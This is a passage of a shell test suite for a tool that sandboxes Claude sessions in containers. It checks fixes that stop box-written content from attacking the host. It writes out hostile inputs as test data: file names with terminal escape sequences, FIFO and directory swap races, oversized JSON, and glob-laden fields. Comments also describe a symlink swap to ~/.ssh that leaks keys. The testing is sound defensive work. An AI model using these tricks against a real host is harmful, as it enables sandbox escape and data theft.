  _c14_bsd_rm "$TEST_TEMP/rm-dst" "/box3" "/.tmp."
  _c14_bsd_rm "$TEST_TEMP/rm-tree" "/box2"
  # The copy itself: at most three lines, each sanitized. The half-copied
  # staging dir is then removed quietly.
  PATH="$TEST_TEMP/bsdcp:$TEST_TEMP/rm-tmp:$PATH" run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/box1"
  assert_failure
  assert_output --partial "leak3-NAME]0;PWN: Permission denied"
  refute_output --partial "leak4-NAME"
  refute_output --partial "gone-NAME"
  refute_output --partial "${esc}]0;PWN"
  rm -rf "$stale"
  # The staging dir a crashed copy left behind.
  mkdir -p "$stale"
  PATH="$TEST_TEMP/rm-tmp:$PATH" run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/box1"
  assert_failure
  assert_output --partial "gone-NAME]0;PWN: Permission denied"
  refute_output --partial "${esc}]0;PWN"
  rm -rf "$stale"
  # The old copy a refresh replaces, the tree the box has been writing, and
  # then the staging dir.
  mkdir -p "$CLEAT_FORKS_DIR/box3"
  PATH="$TEST_TEMP/rm-dst:$PATH" run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/box3"
  assert_failure
  assert_output --partial "gone-NAME]0;PWN: Permission denied"
  refute_output --partial "${esc}]0;PWN"
  rm -rf "$stale"
  # A rename that fails leaves the staging dir to remove, quietly.
  PATH="$TEST_TEMP/failmv:$TEST_TEMP/rm-tmp:$PATH" run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/box4"
  assert_failure
  refute_output --partial "gone-NAME"
  refute_output --partial "${esc}]0;PWN"
  rm -rf "$stale"
  # cleat fork rm and prune.
  mkdir -p "$CLEAT_FORKS_DIR/box2"
  PATH="$TEST_TEMP/rm-tree:$PATH" run _fork_rm_tree "$CLEAT_FORKS_DIR/box2"
  assert_failure
  assert_output --partial "Could not delete"
  assert_output --partial "gone-NAME]0;PWN: Permission denied"
  refute_output --partial "${esc}]0;PWN"
}

# v1.5.4: the session trash sweep ran rm -rf on a trashed session's tree with
# stderr on the terminal, and as its last command. Its contents are the box's,
# so a BSD rm failure printed a box-chosen name raw, and the non-zero status
# ended `cleat sessions` under set -e.
@test "regression v1.5.4: the session trash sweep never prints a box-chosen file name raw" {
  local esc sdir tdir u="11111111-1111-2222-3333-444444444444"
  esc="$(printf '\033')"
  sdir="$HOME/.claude/projects/proj-deadbeef"
  mkdir -p "$sdir"
  tdir="$(_sessions_trash_dir "$sdir")"
  mkdir -p "$tdir/1-$u"
  _c14_bsd_rm "$TEST_TEMP/bsdrm" "1-$u"
  PATH="$TEST_TEMP/bsdrm:$PATH" run _sessions_trash_sweep "$sdir"
  assert_success
  refute_output --partial "${esc}]0;PWN"
  refute_output --partial "gone-NAME"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: the sibling identity scan skipped a pinned box's file and nothing
# else. When the name drop is deferred (a Claude started in the box after the
# live gate), the box is already unpinned and its file still holds the removed
# or left account's oauthAccount, flagged .identity-stale for the next launch.
# The scan never read that flag, and a running Claude keeps the file's mtime
# newest, so every box built on the shared login in another project took that
# account's email and organisation. `cleat account rm` also unpinned before it
# flagged, so a box built between the unpin and the drop took the name even
# when the drop was not deferred, and a remove cut off in that gap left the
# name unflagged for good.
# ─────────────────────────────────────────────────────────────────────────────

# Box A in one project pinned to `work` through the real switch, its file
# naming work@example.com and newer than an unpinned sibling's shared login.
# Leaves the box detached and running. The caller says whether a Claude runs.
_c18_setup() {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
  _CLEAT_NOW_S=1789000000
  curl() { cat >/dev/null 2>&1; return 7; }
  _account_usage_fetch() { return 0; }
  mkdir -p "$CLEAT_ACCOUNTS_DIR/work" "$TEST_TEMP/proj-a"
  chmod 700 "$CLEAT_ACCOUNTS_DIR/work"
  printf '{"claudeAiOauth":{"accessToken":"a-token","refreshToken":"r-token","expiresAt":1789003600000,"subscriptionType":"max"}}\n' \
    > "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  chmod 600 "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  _daemon_up() { return 1; }
  container_exists() { return 1; }
  _box_has_live_agent() { return 1; }
  _C18_PA="$TEST_TEMP/proj-a"
  _C18_CA="$(container_name_for "$_C18_PA" main)"
  run _account_do_switch work main "$_C18_CA" "$_C18_PA"
  assert_success
  # The pin carries the key, the only way the remove reaches A's file.
  run _box_account_key "$_C18_CA"
  assert_success
  _C18_FA="$CLEAT_PROJECTS_DIR/$(_derive_project_session_key "$_C18_PA" main)/claude.json"
  _C18_FS="$CLEAT_PROJECTS_DIR/shared-22222222/claude.json"
  _C18_OUT="$CLEAT_PROJECTS_DIR/third-33333333/claude.json"
  mkdir -p "${_C18_FA%/*}" "${_C18_FS%/*}"
  printf '{"oauthAccount":{"emailAddress":"work@example.com"},"userID":"abc","hasCompletedOnboarding":true}\n' > "$_C18_FA"
  printf '{"oauthAccount":{"emailAddress":"shared@example.com"},"hasCompletedOnboarding":true}\n' > "$_C18_FS"
  # A is the NEWEST, so it wins the scan unless something skips it.
  touch -t 202601010101.01 "$_C18_FS"
  touch -t 202601010202.02 "$_C18_FA"
  printf '{"projects":{}}\n' > "$HOME/.claude.json"
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  # No live agent when the gates ask, so the switch and the remove go ahead.
  _box_has_live_agent() { return 1; }
  _account_box_ready() { return 0; }
}

# What a box built on the shared login in a third project is stamped with.
_c18_third_email() {
  _build_project_claude_json "$_C18_OUT" > /dev/null 2>&1
  jq -r '.oauthAccount.emailAddress // "absent"' "$_C18_OUT"
}

@test "regression v1.5.4: a removed account's name never spreads from a box whose identity drop is deferred" {
  _c18_setup
  # A Claude started in A after the live gate, so the drop waits for it.
  _box_claude_live() { return 0; }
  run _account_do_remove work 1
  assert_success
  run _box_account_read "$_C18_CA"
  assert_output "default"
  run test -e "${_C18_FA}.identity-stale"
  assert_success
  # Never edited under a live Claude.
  run jq -r '.oauthAccount.emailAddress' "$_C18_FA"
  assert_output "work@example.com"
  run _c18_third_email
  assert_output "shared@example.com"
}

@test "regression v1.5.4: a box built while account rm is between the unpin and the drop never takes the removed account's name" {
  _c18_setup
  _box_claude_live() { return 1; }
  # Another terminal builds a box in the moment after the unlock and before
  # the drop, the window where A is unpinned and still names work.
  eval "$(declare -f _account_invalidate_identity_key | sed '1s/_account_invalidate_identity_key/_c18_orig_inv/')"
  _account_invalidate_identity_key() {
    _build_project_claude_json "$_C18_OUT" > /dev/null 2>&1
    _c18_orig_inv "$@"
  }
  run _account_do_remove work 1
  assert_success
  run jq -r '.oauthAccount.emailAddress // "absent"' "$_C18_OUT"
  assert_output "shared@example.com"
  # The drop still ran, and cleared the flag the remove wrote.
  run jq -r '.oauthAccount // "absent"' "$_C18_FA"
  assert_output "absent"
  run test -e "${_C18_FA}.identity-stale"
  assert_failure
}

@test "regression v1.5.4: going back to the shared login while a Claude starts in the box keeps the old account's name out of other projects" {
  _c18_setup
  _box_claude_live() { return 0; }
  run _account_do_switch default main "$_C18_CA" "$_C18_PA"
  assert_success
  assert_output --partial "during the switch"
  run test -e "${_C18_FA}.identity-stale"
  assert_success
  run _c18_third_email
  assert_output "shared@example.com"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: the browser claim tested the bridge file's type only BEFORE the
# rename. The box writes the clip dir, so it could rename a FIFO or a directory
# onto .browser-open between that test and the mv. A FIFO then reached `head`,
# which blocked on open forever inside the watcher's command substitution with
# its TERM trap deferred. A directory was stranded in the claim dir. The mv
# below does the box's swap at exactly that instant, so the race is won every
# time.
@test "regression v1.5.4: a FIFO swapped in before the browser claim hung the watcher" {
  local bridge="$TEST_TEMP/clip/.browser-open" claimdir="$TEST_TEMP/clipclaim"
  mkdir -p "$TEST_TEMP/clip" "$claimdir"
  printf 'https://example.com/x\n' > "$bridge"
  mv() { rm -f "$bridge"; mkfifo "$bridge"; command mv "$@"; }
  # Stubbed so a reverted fix fails fast instead of blocking on the FIFO.
  head() { : > "$TEST_TEMP/head.called"; }
  run _browser_claim_url "$bridge" "$claimdir"
  unset -f mv head
  assert_failure
  run test -e "$TEST_TEMP/head.called"
  assert_failure
  run ls -A "$claimdir"
  assert_output ""
}

@test "regression v1.5.4: a directory swapped in before the browser claim was stranded" {
  local bridge="$TEST_TEMP/clip/.browser-open" claimdir="$TEST_TEMP/clipclaim"
  mkdir -p "$TEST_TEMP/clip" "$claimdir"
  printf 'https://example.com/x\n' > "$bridge"
  mv() { rm -f "$bridge"; mkdir -p "$bridge/sub"; echo x > "$bridge/sub/f"; command mv "$@"; }
  run _browser_claim_url "$bridge" "$claimdir"
  unset -f mv
  assert_failure
  run ls -A "$claimdir"
  assert_output ""
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: host reads of a box's per-project claude.json were unbounded. The box
# writes that file through a read-write bind, so it picks the size, and the host
# read it whole into a shell variable, into jq, into a .bak, into the sibling
# scan of every other box, and padded up to it in place. Every read now goes
# through a bounded snapshot under a cap of the host file plus a headroom. The
# tests shrink the headroom to 1 KB so a 4 KB file stands in for a huge one.
_c19_json_of() {  # SIZE MARKER [KEY:VALUE]: a valid JSON object of about SIZE bytes
  local pad
  pad="$(head -c "$1" /dev/zero | tr '\0' x)"
  printf '{"marker":"%s",%s"pad":"%s"}\n' "$2" "${3:+$3,}" "$pad"
}

@test "regression v1.5.4: a box-sized project claude.json was read whole by the host" {
  command -v jq >/dev/null || skip "needs jq"
  _CLAUDE_JSON_HEADROOM_BYTES=1024
  CLEAT_PROJECTS_DIR="$TEST_TEMP/projects"
  local f="$CLEAT_PROJECTS_DIR/proj-11111111/claude.json"
  mkdir -p "${f%/*}"
  rm -f "$HOME/.claude.json"
  _c19_json_of 4000 BOX-BLOAT-MARKER > "$f"
  run _build_project_claude_json "$f"
  assert_success
  assert_output --partial "is over"
  run test -e "${f}.bak"
  assert_failure
  run grep -c BOX-BLOAT-MARKER "$f"
  assert_output "0"
  run jq -r '.hasCompletedOnboarding' "$f"
  assert_output "true"
}

@test "regression v1.5.4: the sibling identity scan read an oversized box file whole" {
  command -v jq >/dev/null || skip "needs jq"
  _CLAUDE_JSON_HEADROOM_BYTES=1024
  CLEAT_PROJECTS_DIR="$TEST_TEMP/projects"
  _pinned_project_keys() { printf ':'; }
  local sib="$CLEAT_PROJECTS_DIR/sib-22222222/claude.json"
  mkdir -p "${sib%/*}"
  rm -f "$HOME/.claude.json"
  _c19_json_of 4000 S '"oauthAccount":{"emailAddress":"a@example.com"}' > "$sib"
  run _newest_sibling_identity "$CLEAT_PROJECTS_DIR/me-33333333/claude.json"
  assert_success
  assert_output ""
}

@test "regression v1.5.4: the in-place writer padded an oversized box file" {
  _CLAUDE_JSON_HEADROOM_BYTES=1024
  rm -f "$HOME/.claude.json"
  _c19_json_of 4000 BIG > "$TEST_TEMP/dst.json"
  cp "$TEST_TEMP/dst.json" "$TEST_TEMP/dst.orig"
  printf '{"small":true}\n' > "$TEST_TEMP/src.json"
  run _write_in_place "$TEST_TEMP/src.json" "$TEST_TEMP/dst.json"
  assert_failure
  run cmp "$TEST_TEMP/dst.json" "$TEST_TEMP/dst.orig"
  assert_success
}

@test "regression v1.5.4: the jq-less identity drop kept unbounded output from the box jq" {
  _hide_jq
  _CLAUDE_JSON_HEADROOM_BYTES=1024
  rm -f "$HOME/.claude.json"
  _daemon_up() { return 0; }
  is_running() { return 0; }
  # The box's jq is the box's own binary, so it can print anything. Here it
  # prints a valid object far past the cap.
  docker() {
    if [ "$1" = exec ]; then
      cat > /dev/null
      _c19_json_of 4000 FROM-THE-BOX
    fi
  }
  local f="$TEST_TEMP/proj/claude.json"
  mkdir -p "${f%/*}"
  printf '{"oauthAccount":{"emailAddress":"a@example.com"},"userID":"u"}\n' > "$f"
  cp "$f" "$TEST_TEMP/f.orig"
  run _claude_json_drop_identity "$f" box
  assert_failure
  run cmp "$f" "$TEST_TEMP/f.orig"
  assert_success
  run bash -c 'ls -A "$1" | grep -v -e "^claude.json$"' _ "${f%/*}"
  assert_output ""
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: the drop log is per install, so another box's bridge can rotate it
# during this session. The report then read the new file from this session's
# offset and missed this box's drops written before the rotation. The inode
# captured with the offset lets it read the rotated file from the offset first.
@test "regression v1.5.4: a hook drop log rotated by another box silenced the report" {
  local log="$CLEAT_STATE_DIR/hook-drops.log" off ino i
  mkdir -p "$CLEAT_STATE_DIR"
  for i in $(seq 1 50); do
    printf 'now\t%s\tjson\tbox-a\tmd5\t0\told\n' "$_HOOK_DROP_MARK"
  done > "$log"
  off="$(_path_size "$log")"
  ino="$(_path_ino "$log")"
  [ -n "$ino" ]
  printf 'now\t%s\tjson\tbox-a\tmd5\t0\tthis-session\n' "$_HOOK_DROP_MARK" >> "$log"
  mv "$log" "$log.1"
  for i in $(seq 1 100); do
    printf 'now\t%s\tjson\tbox-b\tmd5\t0\tsibling\n' "$_HOOK_DROP_MARK"
  done > "$log"
  run _maybe_report_hook_drops "$log" "$off" box-a "$ino"
  assert_success
  assert_output --partial "hook event from the box"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: the fork copy ran over a tree a running box could write. cp is path
# based on both BSD and GNU, so a box renaming a directory into a symlink to
# ~/.ssh mid-copy had the key bytes copied into the fork as real files. Every
# running box that can write the project is now paused around the copy.
@test "regression v1.5.4: a box on the live tree was not paused while the fork copied it" {
  local proj="$TEST_TEMP/project" dlog="$TEST_TEMP/order.log" own
  mkdir -p "$proj/src"
  echo code > "$proj/src/app.js"
  CLEAT_FORKS_DIR="$TEST_TEMP/forks"
  CLEAT_BOXES_DIR="$TEST_TEMP/boxes"
  own="$(container_name_for "$proj")"
  _daemon_up() { return 0; }
  docker() {
    case "$1" in
      ps) printf '%s\n' "$own" ;;
      inspect) printf '%s\n' "$proj" ;;
      pause|unpause) echo "$1" >> "$dlog" ;;
    esac
  }
  cp() {
    case " $* " in *" $proj/. "*) echo cp >> "$dlog" ;; esac
    command cp "$@"
  }
  run _fork_copy_tree "$proj" "$(_fork_root)/cleat-fork-test"
  unset -f cp docker
  assert_success
  run cat "$dlog"
  assert_output "pause
cp
unpause"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: box-authored text was word-split with globbing on. The live account
# switch parses probe and terminate lines the box prints, and a field like
# /*/*/*/*/*/*/*/* made the host walk its own filesystem before any check.
# The config editor split a caps line the same way, so a `*` in a project
# .cleat expanded into the names of the files in the working directory, and a
# file named docker became the docker cap.
@test "regression v1.5.4: a probe line glob-expanded against the host filesystem" {
  local d="$TEST_TEMP/globdir" i cap="$TEST_TEMP/probe.cap"
  mkdir -p "$d"
  for i in 1 2 3 4 5 6 7 8 9; do : > "$d/a$i"; done
  printf 'hb\t1\nargs\tok\nclaude\t%s\nend\tok\n' "$d/a*" > "$cap"
  run _handoff_parse_probe "$cap"
  assert_failure
  _handoff_parse_probe "$cap" || true
  assert_equal "${#_HO_PID[@]}" 0
}

@test "regression v1.5.4: a terminate line glob-expanded against the host filesystem" {
  local d="$TEST_TEMP/globdir" cap="$TEST_TEMP/term.cap"
  mkdir -p "$d"
  : > "$d/alive"
  printf 'hb\t1\nargs\tok\npid\t7 al*\nscan\tok\nend\tok\n' > "$cap"
  cd "$d"
  _parse_terminate "$cap" || true
  assert_equal "$_PT_ANY_ALIVE" 0
}

@test "regression v1.5.4: a background shell id glob-expanded against the host filesystem" {
  local d="$TEST_TEMP/globdir"
  mkdir -p "$d"
  : > "$d/execA"
  _handoff_marker_orphans() { :; }
  _handoff_id_ok() { return 0; }
  _handoff_marker_live_for_exec() { return 0; }
  _box_account_read() { printf '%s' "$_ACCOUNT_DEFAULT"; }
  _sessions_key_dir() { printf '%s' "$TEST_TEMP/sd"; }
  _sessions_is_uuid() { return 0; }
  _handoff_sid_has_transcript() { return 0; }
  _handoff_tail_flags() { echo "0 0"; }
  _handoff_last_permission_mode() { :; }
  _resume_model_in_settings() { return 0; }
  _HO_PID=(7); _HO_PS=(5); _HO_STATUS=(busy); _HO_WAIT=(none); _HO_KIND=(interactive)
  _HO_EXEC=(execA); _HO_STORE=(default); _HO_SID=(d7b73579-1111-2222-3333-444455556666); _HO_VER=("")
  _HO_ORPHANS=""
  _HO_SHELLS=" exe*"
  cd "$d"
  _handoff_classify cleat-x-12345678 1 "$TEST_TEMP/proj" "$_ACCOUNT_DEFAULT"
  assert_equal "$_HO_VERDICT" R3
}

_c19_star_project() {
  C19_PROJ="$TEST_TEMP/starproj"
  mkdir -p "$C19_PROJ"
  : > "$C19_PROJ/docker"
  printf '[caps]\n*\ngit\n' > "$C19_PROJ/.cleat"
  cd "$C19_PROJ"
}

@test "regression v1.5.4: a star cap glob-expanded into workspace file names in the text editor" {
  _c19_star_project
  run _config_picker_text "$C19_PROJ/.cleat" project "$C19_PROJ" <<< $'git\ndone'
  assert_success
  run _read_caps_from_file "$C19_PROJ/.cleat"
  refute_output --partial "docker"
  refute_output --partial "git"
}

@test "regression v1.5.4: a star cap glob-expanded into workspace file names in the picker" {
  _c19_star_project
  # Cursor starts on the git row: SPACE turns git off, ENTER saves. The key
  # reader runs in a command substitution, so its position lives in a file.
  _read_keypress() {
    local n
    n="$(cat "$TEST_TEMP/kp" 2>/dev/null || echo 0)"
    echo $(( n + 1 )) > "$TEST_TEMP/kp"
    case "$n" in 0) echo SPACE ;; *) echo ENTER ;; esac
  }
  run _config_picker_tui "$C19_PROJ/.cleat" project "$C19_PROJ"
  assert_success
  run cat "$TEST_TEMP/kp"
  assert_output "2"
  run _read_caps_from_file "$C19_PROJ/.cleat"
  refute_output --partial "docker"
  refute_output --partial "git"
}
